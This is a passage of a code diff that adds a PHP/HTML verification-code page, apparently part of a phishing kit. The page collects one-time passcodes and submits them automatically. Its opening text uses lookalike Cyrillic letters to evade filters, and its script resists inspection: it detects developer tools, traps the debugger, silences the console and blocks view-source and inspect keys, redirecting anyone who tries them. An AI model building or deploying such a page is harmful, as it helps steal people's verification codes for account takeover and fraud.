+        А mеѕѕаgе wіth а vеrіfісаtіоn соdе hаѕ bееn ѕеnt tо<br>' . htmlspecialchars($fdsgsss ?? '') . ' Рlеаѕе еntеr thе соdе tо соntіnuе.
+    </div>
+
+    <div id="verifyingSection" style="text-align: center; margin-top: 20px; display: none;">
+        <img src="igassesw/loadingV.gif" alt="Loading..." style="width: 48px; height: 48px;">
+        <p style="font-size: 16px; color: #494949; margin-top: 10px;">Verifying</p>
+    </div>';
+
+// Add error message if exists
+if ($error) {
+    $htmlTemplate .= '<div style="text-align: center; font-size: 18px; color: red; margin-top: 20px;">
+        Invalid OTP. Please try again.
+    </div>';
+}
+
+$htmlTemplate .= '
+    <style>
+        .otp-input {
+            width: 48px;
+            height: 58px;
+            font-size: 32px;
+            font-weight: 600;
+            text-align: center;
+            border: 2px solid #d1d1d6;
+            border-radius: 8px;
+            background-color: #f7f7f7;
+            box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+            outline-offset: 2px;
+        }
+        .otp-input:focus {
+            border-color: #0071e3;
+            box-shadow: 0 0 4px 2px #abd4ff;
+            background-color: #ffffff;
+            outline: none;
+        }
+    </style>
+
+    <script>
+        // Hide #loadingOverlay after page load to reveal content
+        document.addEventListener("DOMContentLoaded", function() {
+            const overlay = document.getElementById("loadingOverlay");
+            if (overlay) {
+                overlay.style.display = "none";
+            }
+            
+            // JavaScript to auto-move focus between OTP inputs, restrict to digits and allow backspace navigation
+            const inputs = document.querySelectorAll(".otp-input");
+            inputs.forEach((input, index) => {
+                input.addEventListener("input", (e) => {
+                    let value = input.value;
+                    // Only allow digits
+                    if (!/^[0-9]?$/.test(value)) {
+                        input.value = "";
+                        return;
+                    }
+                    if (value.length === 1 && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                    // Check if all inputs are filled
+                    const allFilled = Array.from(inputs).every(inp => inp.value.length === 1);
+                    if (allFilled) {
+                        // Show verifying section
+                        const verifyingSection = document.getElementById("verifyingSection");
+                        if (verifyingSection) {
+                            verifyingSection.style.display = "block";
+                        }
+                        // Submit the form after a short delay to show the verifying message
+                        setTimeout(() => {
+                            input.closest("form").submit();
+                        }, 1000); // 1 second delay
+                    }
+                });
+
+                input.addEventListener("keydown", (e) => {
+                    if (e.key === "Backspace" && input.value === "" && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+
+                input.addEventListener("paste", (e) => {
+                    e.preventDefault();
+                    let pasteData = e.clipboardData.getData("text").trim().slice(0, inputs.length);
+                    for (let i = 0; i < pasteData.length; i++) {
+                        if (i < inputs.length) {
+                            if (/^[0-9]$/.test(pasteData[i])) {
+                                inputs[i].value = pasteData[i];
+                            }
+                        }
+                    }
+                    // Focus the last filled input or the last input
+                    let focusIndex = Math.min(pasteData.length, inputs.length - 1);
+                    inputs[focusIndex].focus();
+                });
+            });
+        });
+
+        const checkSize = () => {
+            const threshold = 160;
+            if (window.outerWidth - window.innerWidth > threshold || 
+                window.outerHeight - window.innerHeight > threshold) {
+                redirect();
+            }
+        };
+        setInterval(checkSize, 500);
+
+        const trap = function() {
+            const start = performance.now();
+            debugger;
+            const end = performance.now();
+            if (end - start > 100) {
+                redirect();
+            }
+        };
+
+        (function loop() {
+            (function() {
+                (function() {
+                    trap();
+                }());
+            }());
+            setTimeout(loop, 200);
+        }());
+
+        const noop = () => {};
+        Object.keys(window.console).forEach(method => {
+            window.console[method] = noop;
+        });
+
+        document.addEventListener("keydown", e => {
+            if (e.keyCode === 123 || 
+               (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode)) || 
+               (e.ctrlKey && [85, 83].includes(e.keyCode))) {
+                e.preventDefault();
+                redirect();
+            }
+        });
+    </script>
+</body>
+</html>';
+
+// Output the template
+echo $htmlTemplate;
+
+ob_end_flush();
+?>
